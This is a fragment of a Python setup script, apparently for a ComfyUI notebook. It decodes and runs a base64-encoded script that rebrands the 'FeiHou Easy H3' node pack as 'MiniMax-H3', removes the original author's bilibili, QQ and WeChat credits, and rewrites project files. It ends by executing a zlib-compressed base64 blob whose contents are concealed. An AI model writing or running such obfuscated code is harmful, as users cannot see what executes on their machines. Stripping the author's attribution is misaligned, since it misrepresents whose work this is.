SBIMyBcXHU1MmEwXFx1OGY3ZFxcdTU2NjgnLCAnTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagnKQogICAgdHh0ID0gdHh0LnJlcGxhY2UoJ0ZlaUhvdSBFYXN5IEgzIFJlbWl4XFx1NTJhMFxcdThmN2RcXHU1NjY4JywgJ01pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU4ZjkzXFx1NTFmYScsICdNaW5pTWF4LUgzIOmfs+eUu+WQjOatpei+k+WHuicpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnY2F0ZWdvcnk6ICJGZWlIb3UgRWFzeSBIMyInLCAnY2F0ZWdvcnk6ICJNaW5pTWF4LUgzIOW3peS9nOWPsCInKQogICAgdWlfanMud3JpdGVfdGV4dCh0eHQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDIuIENsZWFuIG90aGVyIHdlYi8qLmpzIGZpbGVzIGZvciBGZWlIb3UgdGl0bGVzIGFuZCByZS1jb21wcmVzcyAuanMuZ3oKZm9yIGpzX3AgaW4gKGJhc2VfZGlyIC8gIndlYiIpLmdsb2IoIiouanMiKToKICAgIHQgPSBqc19wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKQogICAgdCA9IHQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDliqDovb3lmagiLCAiTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMgUmVtaXjliqDovb3lmagiLCAiTWluaU1heC1IMyDkuozlkIjkuIDliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOaPkOekuuivjemihOiniCIsICJNaW5pTWF4LUgzIOaPkOekuuivjemihOiniCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDkuozmrKHph4fmoLciLCAiTWluaU1heC1IMyDkuozpmLbmrrXnsr7kv67ph4fmoLciKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIiwgIk1pbmlNYXgtSDMiKQogICAganNfcC53cml0ZV90ZXh0KHQsIGVuY29kaW5nPSJ1dGYtOCIpCiAgICBnel9wID0gcGF0aGxpYi5QYXRoKHN0cihqc19wKSArICIuZ3oiKQogICAgd2l0aCBvcGVuKGpzX3AsICJyYiIpIGFzIGZfaW4sIGd6aXAub3Blbihnel9wLCAid2IiLCBjb21wcmVzc2xldmVsPTYpIGFzIGZfb3V0OgogICAgICAgIHNodXRpbC5jb3B5ZmlsZW9iaihmX2luLCBmX291dCkKCiMgMy4gQ2xlYW4gbG9jYWxlcy96aC9ub2RlRGVmcy5qc29uCnpoX2RlZnMgPSBiYXNlX2RpciAvICJsb2NhbGVzIiAvICJ6aCIgLyAibm9kZURlZnMuanNvbiIKaWYgemhfZGVmcy5leGlzdHMoKToKICAgIHp0ID0gemhfZGVmcy5yZWFkX3RleHQoZW5jb2Rpbmc9InV0Zi04IikKICAgIHp0ID0genQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOWKoOi9veWZqCIsICJNaW5pTWF4LUgzIOS4gOS9k+WMluWKoOi9veWZqCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIFJlbWl45Yqg6L295ZmoIiwgIk1pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5o+Q56S66K+N6aKE6KeIIiwgIk1pbmlNYXgtSDMg5o+Q56S66K+N6aKE6KeIIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5LqM5qyh6YeH5qC3IiwgIk1pbmlNYXgtSDMg5LqM6Zi25q6157K+5L+u6YeH5qC3IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpCiAgICB6aF9kZWZzLndyaXRlX3RleHQoenQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDQuIFVwZGF0ZSBjYWNoZV9taWRkbGV3YXJlLnB5IHNvIC9hc3NldHMvIGlzIGNhY2hlZCA3IGRheXMgd2hpbGUgL2V4dGVuc2lvbnMvIGlzIG5vLWNhY2hlCmNtX3AgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvbWlkZGxld2FyZS9jYWNoZV9taWRkbGV3YXJlLnB5IikKY21fcC53cml0ZV90ZXh0KCIiImZyb20gYWlvaHR0cCBpbXBvcnQgd2ViCmZyb20gdHlwaW5nIGltcG9ydCBDYWxsYWJsZSwgQXdhaXRhYmxlCk9ORV9EQVk6IGludCA9IDg2NDAwCklNR19FWFRFTlNJT05TID0gKCIuanBnIiwgIi5qcGVnIiwgIi5wbmciLCAiLnBwbSIsICIuYm1wIiwgIi5wZ20iLCAiLnRpZiIsICIudGlmZiIsICIud2VicCIsICIud29mZiIsICIud29mZjIiLCAiLnR0ZiIsICIuc3ZnIikKQHdlYi5taWRkbGV3YXJlCmFzeW5jIGRlZiBjYWNoZV9jb250cm9sKHJlcXVlc3Q6IHdlYi5SZXF1ZXN0LCBoYW5kbGVyOiBDYWxsYWJsZVtbd2ViLlJlcXVlc3RdLCBBd2FpdGFibGVbd2ViLlJlc3BvbnNlXV0pIC0+IHdlYi5SZXNwb25zZToKICAgIHJlc3BvbnNlOiB3ZWIuUmVzcG9uc2UgPSBhd2FpdCBoYW5kbGVyKHJlcXVlc3QpCiAgICBpZiByZXF1ZXN0LnBhdGguc3RhcnRzd2l0aCgiL2Fzc2V0cy8iKToKICAgICAgICByZXNwb25zZS5oZWFkZXJzWyJDYWNoZS1Db250cm9sIl0gPSAicHVibGljLCBtYXgtYWdlPTYwNDgwMCwgaW1tdXRhYmxlIgogICAgICAgIHJldHVybiByZXNwb25zZQogICAgaWYgcmVxdWVzdC5wYXRoLnN0YXJ0c3dpdGgoIi9leHRlbnNpb25zLyIpOgogICAgICAgIHJlc3BvbnNlLmhlYWRlcnNbIkNhY2hlLUNvbnRyb2wiXSA9ICJuby1jYWNoZSIKICAgICAgICByZXR1cm4gcmVzcG9uc2UKICAgIGlmIHJlcXVlc3QucGF0aC5sb3dlcigpLmVuZHN3aXRoKElNR19FWFRFTlNJT05TKSBhbmQgcmVzcG9uc2Uuc3RhdHVzID09IDIwMDoKICAgICAgICByZXNwb25zZS5oZWFkZXJzLnNldGRlZmF1bHQoIkNhY2hlLUNvbnRyb2wiLCAicHVibGljLCBtYXgtYWdlPTg2NDAwIikKICAgIHJldHVybiByZXNwb25zZQoiIiIsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDUuIENsZWFuIGFsbCB3b3JrZmxvd3MgaW4gL2NvbnRlbnQvQ29tZnlVSS91c2VyL2RlZmF1bHQvd29ya2Zsb3dzLwp3Zl9kaXIgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvdXNlci9kZWZhdWx0L3dvcmtmbG93cyIpCmRlZiBjbGVhbl9ub2Rlcyhub2Rlcyk6CiAgICBrZWVwID0gW10KICAgIGZvciBuIGluIG5vZGVzOgogICAgICAgIG50eXBlID0gc3RyKG4uZ2V0KCJ0eXBlIikgb3IgIiIpCiAgICAgICAgdGl0bGUgPSBzdHIobi5nZXQoInRpdGxlIikgb3IgIiIpCiAgICAgICAgd3ZhbHMgPSBuLmdldCgid2lkZ2V0c192YWx1ZXMiKQogICAgICAgIGlmIGFueShiYWQgaW4gdGl0bGUgZm9yIGJhZCBpbiAoImJpbGliaWxpLmNvbSIsICLkuInlsYLmpbznmoTlsI/ogqXnjLQiLCAi5bCP6IKl54y0IiwgImZ4LWZlaWhvdSIsICIxMDkxNTkzMzY3IiwgIuWKoOW+ruS/oSIsICJR576kIikpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmIG50eXBlIGluICgiRmVpSG91RWFzeUgzUHJvZHVjdGlvblBhY2tMb2FkZXIiLCAiTWluaU1heEgzUmVmTW9kc0xvYWRlciIpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmICJGZWlIb3UiIGluIHRpdGxlIG9yICLlsI/ogqXnjLQiIGluIHRpdGxlOgogICAgICAgICAgICBuWyJ0aXRsZSJdID0gdGl0bGUucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpLnJlcGxhY2UoIkZlaUhvdSIsICJNaW5pTWF4LUgzIikucmVwbGFjZSgi5bCP6IKl54y0IiwgIiIpCiAgICAgICAgaWYgbnR5cGUgPT0gIkZlaUhvdUVhc3lIMyIgYW5kIGlzaW5zdGFuY2Uod3ZhbHMsIGxpc3QpOgogICAgICAgICAgICBmb3IgaWR4LCB2YWwgaW4gZW51bWVyYXRlKHd2YWxzKToKICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UodmFsLCBzdHIpIGFuZCAoIumYv+mHjOS6kSIgaW4gdmFsIG9yICJxd2VuIiBpbiB2YWwgb3IgInpoaXB1IiBpbiB2YWwpOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeF0gPSAiIgogICAgICAgICAgICAgICAgICAgIGlmIGlkeCA+PSAxIGFuZCBpc2luc3RhbmNlKHd2YWxzW2lkeC0xXSwgYm9vbCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeC0xXSA9IEZhbHNlCiAgICAgICAgICAgIGlmIGxlbih3dmFscykgPj0gMTY6CiAgICAgICAgICAgICAgICBmb3IgayBpbiByYW5nZShsZW4od3ZhbHMpKToKICAgICAgICAgICAgICAgICAgICBpZiB3dmFsc1trXSBpbiAoIuaMieW6j+WPtyIsICLmjInmlofku7blkI0iLCAiaW5kZXgiLCAiZmlsZW5hbWUiKSBhbmQgayArIDIgPCBsZW4od3ZhbHMpOgogICAgICAgICAgICAgICAgICAgICAgICB3dmFsc1trKzFdID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgd3ZhbHNbaysyXSA9ICIiCiAgICAgICAgICAgIGZvciBrIGluIHJhbmdlKG1pbig0LCBsZW4od3ZhbHMpKSk6CiAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKHd2YWxzW2tdLCBzdHIpIGFuZCB3dmFsc1trXS5zdHJpcCgpID09ICIiOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2tdID0gIueUu+mdouS4reeahOinkuiJsuiHqueEtui/kOWKqO+8jOWFieW9see7huiFu+ecn+Wunu+8jOeUteW9see6p+mrmOa4heeUu+i0qOOAgiIKICAgICAgICBpZiBpc2luc3RhbmNlKG4uZ2V0KCJwcm9wZXJ0aWVzIiksIGRpY3QpOgogICAgICAgICAgICBuWyJwcm9wZXJ0aWVzIl0ucG9wKCJmZWlob3VfaDNfb3B0aW1pemVyX2xhc3RfcmVzdWx0IiwgTm9uZSkKICAgICAgICBrZWVwLmFwcGVuZChuKQogICAgcmV0dXJuIGtlZXAKCmZvciB3Zl9wIGluIGxpc3Qod2ZfZGlyLmdsb2IoIiouanNvbiIpKToKICAgIHdmID0ganNvbi5sb2Fkcyh3Zl9wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKSkKICAgIHdmWyJub2RlcyJdID0gY2xlYW5fbm9kZXMod2YuZ2V0KCJub2RlcyIsIFtdKSkKICAgIGZvciBzZyBpbiB3Zi5nZXQoImRlZmluaXRpb25zIiwge30pLmdldCgic3ViZ3JhcGhzIiwgW10pOgogICAgICAgIHNnWyJub2RlcyJdID0gY2xlYW5fbm9kZXMoc2cuZ2V0KCJub2RlcyIsIFtdKSkKICAgIHZhbGlkX2lkcyA9IHtuLmdldCgiaWQiKSBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pfQogICAgaWYgImxpbmtzIiBpbiB3ZiBhbmQgaXNpbnN0YW5jZSh3ZlsibGlua3MiXSwgbGlzdCk6CiAgICAgICAgd2ZbImxpbmtzIl0gPSBbbCBmb3IgbCBpbiB3ZlsibGlua3MiXSBpZiBsWzFdIGluIHZhbGlkX2lkcyBhbmQgbFszXSBpbiB2YWxpZF9pZHNdCiAgICAgICAgdmFsaWRfbGlua19pZHMgPSB7bFswXSBmb3IgbCBpbiB3ZlsibGlua3MiXX0KICAgICAgICBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pOgogICAgICAgICAgICBmb3IgaW5wIGluIG4uZ2V0KCJpbnB1dHMiLCBbXSk6CiAgICAgICAgICAgICAgICBpZiBpbnAuZ2V0KCJsaW5rIikgaXMgbm90IE5vbmUgYW5kIGlucC5nZXQoImxpbmsiKSBub3QgaW4gdmFsaWRfbGlua19pZHM6CiAgICAgICAgICAgICAgICAgICAgaW5wWyJsaW5rIl0gPSBOb25lCiAgICBuZXdfbmFtZSA9IHdmX3AubmFtZQogICAgaWYgIuWNg+mXriIgbm90IGluIG5ld19uYW1lIGFuZCAicXdlbiIgbm90IGluIG5ld19uYW1lLmxvd2VyKCk6CiAgICAgICAgaWYgIjA4XyIgaW4gbmV3X25hbWU6CiAgICAgICAgICAgIG5ld19uYW1lID0gIjA4X+WFqOiDveS4gOS9k1/ljZXph4fmnoHpgJ8uanNvbiIKICAgICAgICBlbGlmICIwOV8iIGluIG5ld19uYW1lOgogICAgICAgICAgICBuZXdfbmFtZSA9ICIwOV/lhajog73kuIDkvZNf5LqM6YeH57K+5L+uLmpzb24iCiAgICAgICAgZWxpZiAiMTBfIiBpbiBuZXdfbmFtZToKICAgICAgICAgICAgbmV3X25hbWUgPSAiMTBf5YWo6IO95LiA5L2TXzNE5pS+5aSn6ZSB6IS4Lmpzb24iCiAgICBvdXRfcCA9IHdmX2RpciAvIG5ld19uYW1lCiAgICBvdXRfcC53cml0ZV90ZXh0KGpzb24uZHVtcHMod2YsIGVuc3VyZV9hc2NpaT1GYWxzZSwgaW5kZW50PTIpLCBlbmNvZGluZz0idXRmLTgiKQogICAgaWYgb3V0X3AgIT0gd2ZfcCBhbmQgd2ZfcC5leGlzdHMoKToKICAgICAgICB3Zl9wLnVubGluaygpCgpwcmludCgiQ0xFQU5VUF9TVUNDRVNTOiIsIFtwLm5hbWUgZm9yIHAgaW4gc29ydGVkKHdmX2Rpci5nbG9iKCIqLmpzb24iKSldKQoKIyBSZW5hbWUgd2ViLyouanMgdG8gbWluaW1heF9oM19jbGVhbl8qLmpzIGFuZCB1cGRhdGUgaW1wb3J0CmltcG9ydCBzdWJwcm9jZXNzCnN1YnByb2Nlc3MucnVuKCIiIgpjZCAvY29udGVudC9Db21meVVJL2N1c3RvbV9ub2Rlcy9Db21meVVJLUZlaUhvdS1FYXN5LUgzL3dlYiAyPi9kZXYvbnVsbCB8fCBleGl0IDAKZm9yIGYgaW4gZmVpaG91X2Vhc3lfaDNfKi5qczsgZG8KICAgIFsgLWUgIiRmIiBdIHx8IGNvbnRpbnVlCiAgICBuZXdfZj0kKGVjaG8gIiRmIiB8IHNlZCAncy9mZWlob3VfZWFzeV9oM18vbWluaW1heF9oM19jbGVhbl8vJykKICAgIG12IC1mICIkZiIgIiRuZXdfZiIKICAgIFsgLWUgIiR7Zn0uZ3oiIF0gJiYgbXYgLWYgIiR7Zn0uZ3oiICIke25ld19mfS5neiIKZG9uZQppZiBbIC1mIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzIF07IHRoZW4KICAgIHNlZCAtaSAncy9mZWlob3VfZWFzeV9oM191aS5qcy9taW5pbWF4X2gzX2NsZWFuX3VpLmpzL2cnIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCiAgICBnemlwIC1rIC1mIC02IG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCmZpCiIiIiwgc2hlbGw9VHJ1ZSkK | base64 -d | python3", shell=True)

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

import zlib as _vz, base64 as _vb; exec(_vz.decompress(_vb.b64decode("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